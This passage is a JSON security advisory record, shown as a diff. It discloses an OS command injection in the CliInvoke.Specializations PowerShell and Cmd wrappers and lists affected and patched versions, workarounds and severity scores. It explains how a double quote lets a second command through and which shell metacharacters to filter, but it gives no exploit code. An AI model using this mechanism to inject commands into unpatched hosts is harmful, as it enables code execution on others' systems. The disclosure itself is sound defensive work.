+    "ghsa_id": "GHSA-wrvw-254r-wpmv",
+    "cve_id": "CVE-2026-100368",
+    "url": "https://api.github.com/advisories/GHSA-wrvw-254r-wpmv",
+    "html_url": "https://github.com/advisories/GHSA-wrvw-254r-wpmv",
+    "summary": "CliInvoke.Specializations has command injection in PowerShell and Cmd shell wrappers",
+    "description": "### Impact\nAn OS command injection vulnerability exists in the PowerShell and Cmd shell wrappers provided by the `CliInvoke.Specializations` package (the `PowershellProcessInvoker`/`CmdProcessInvoker` invokers, and the `UsePowerShell`/`UseCmd` middleware in v3 pre-release versions).\n\nThe wrappers re-run a caller-supplied target and arguments inside a shell command (`pwsh -Command ...` / `cmd /c ...`). In affected versions the wrapped command was delivered to the operating system as a single `ProcessStartInfo.Arguments` string. The OS command-line parser re-tokenizes that string before the shell parses it, so a double quote (`\"`) in the target or arguments breaks OS-level quoting and lets the wrapped shell reassemble a second, unintended command. \n\nAn attacker could exploit this to execute arbitrary commands with the privileges of the host process.\n\n### Patches\nThe Specializations Packages now deliver the command via `ProcessStartInfo.ArgumentList` (natively where supported, and polyfilled in older TFMs), so that the operating system passes argv verbatim and only the shell parses the command once. \n\nUpgrade to:\n- **2.8.5** (2.8.x line)\n- **2.9.4** (2.9.x line)\n- **2.10.5** (2.10.x line)\n- **3.0.0-beta.1** (3.x pre-release line)\n\n### Workarounds\nNo complete workaround is available. Until upgraded:\n\n- Reject or strip `\"` from any target path or argument passed to the PowerShell/Cmd wrappers. On 2.2.0 – 2.9.2 and 3.0.0-alpha.1 – alpha.4, also reject shell metacharacters (`;`, `|`, `&`, `$`, backtick, parentheses).\n- Alternatively, bypass the wrappers for untrusted input and invoke the target process directly so that no second shell parse of the data occurs.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": "https://api.github.com/repos/alastairlundy/CliInvoke/security-advisories/GHSA-wrvw-254r-wpmv",
+    "source_code_location": "https://github.com/alastairlundy/CliInvoke",
+    "identifiers": [
+      {
+        "value": "GHSA-wrvw-254r-wpmv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-100368",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/alastairlundy/CliInvoke/security/advisories/GHSA-wrvw-254r-wpmv",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-100368",
+      "https://github.com/alastairlundy/CliInvoke/commit/1e98582f02eb43e345e5b97b8dd6ff9443806685",
+      "https://github.com/alastairlundy/CliInvoke/commit/2077e5239850e83dc9cc67ae6036dcd4e68a1876",
+      "https://github.com/alastairlundy/CliInvoke/releases/tag/2.10.5",
+      "https://github.com/alastairlundy/CliInvoke/releases/tag/3.0.0-beta.1",
+      "https://github.com/advisories/GHSA-wrvw-254r-wpmv"
+    ],
+    "published_at": "2026-09-25T21:41:48Z",
+    "updated_at": "2026-09-25T21:41:49Z",
+    "github_reviewed_at": "2026-09-25T21:41:48Z",
+    "nvd_published_at": "2026-09-25T20:17:05Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 2.2.0, <= 2.8.4",
+        "first_patched_version": "2.8.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 2.9.0, <= 2.9.3",
+        "first_patched_version": "2.9.4",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 2.10.0, <= 2.10.4",
+        "first_patched_version": "2.10.5",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 3.0.0-alpha.1, <= 3.0.0-alpha.4",
+        "first_patched_version": "3.0.0-beta.1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 3.0.0-alpha.8, <= 3.0.0-alpha.10",
+        "first_patched_version": "3.0.0-beta.1",
+        "vulnerable_functions": [
+
+        ]
+      },
+      {
+        "package": {
+          "ecosystem": "nuget",
+          "name": "AlastairLundy.CliInvoke.Specializations"
+        },
+        "vulnerable_version_range": ">= 1.0.0-rc.1, <= 1.6.1.1",
+        "first_patched_version": "2.0.2",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.4
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+      }
+    ],
+    "credits": [
+
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.4
+    },
+    "epss": {
+      "percentage": 0.00581,
+      "percentile": 0.45541
+    }
+  }
+]
